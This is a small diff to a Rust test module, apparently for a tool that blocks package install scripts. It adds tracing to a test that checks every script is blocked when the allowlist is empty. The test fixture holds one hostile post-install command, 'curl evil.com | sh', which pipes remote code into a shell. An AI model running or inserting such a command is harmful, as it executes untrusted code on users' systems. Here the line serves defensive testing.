@@ -83,6 +83,7 @@ mod tests {
     }
 
     #[test]
+    #[tracing_test::traced_test]
     fn all_blocked_with_empty_allowlist() {
         let scripts = vec![
             make_script("evil-pkg", "post-install", "curl evil.com | sh"),
